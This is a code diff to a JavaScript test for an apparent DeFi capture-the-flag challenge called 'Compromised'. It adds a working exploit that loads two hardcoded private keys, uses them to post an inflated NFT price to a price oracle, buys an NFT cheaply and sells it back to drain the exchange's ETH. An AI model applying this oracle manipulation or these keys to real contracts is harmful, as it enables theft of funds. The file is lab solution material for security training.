@@ -52,13 +52,34 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {
 
+        let receipt = await this.exchange.buyOne({ from: attacker, value: ether('999') });
+        let tokenId = parseInt(receipt.logs[0].args.tokenId);
+
+        const OracleContract = new web3.eth.Contract(this.oracle.abi, this.oracle.address);
+
+        let source1 = web3.eth.accounts.privateKeyToAccount('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9');
+        web3.eth.accounts.wallet.add(source1);
+        web3.eth.defaultAccount = source1.address;
+
+        await OracleContract.methods.postPrice('DVNFT', '10999000000000000000000').send({ from: source1.address, gas: 6721975 });
+
+
+        let source2 = web3.eth.accounts.privateKeyToAccount('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48');
+        web3.eth.accounts.wallet.add(source2);
+        web3.eth.defaultAccount = source2.address;
+
+        await OracleContract.methods.postPrice('DVNFT', '10999000000000000000000').send({ from: source2.address, gas: 6721975 });
+
+        await this.token.approve(this.exchange.address, tokenId, { from: attacker });
+        await this.exchange.sellOne(tokenId, { from: attacker });
+
         /** YOUR EXPLOIT GOES HERE */
     });
 
-    // after(async function () {
-    //     // Exchange must have lost all ETH
-    //     expect(
-    //         await balance.current(this.exchange.address)
-    //     ).to.be.bignumber.eq('0');
-    // });
+    after(async function () {
+        // Exchange must have lost all ETH
+        expect(
+            await balance.current(this.exchange.address)
+        ).to.be.bignumber.eq('0');
+    });
 });
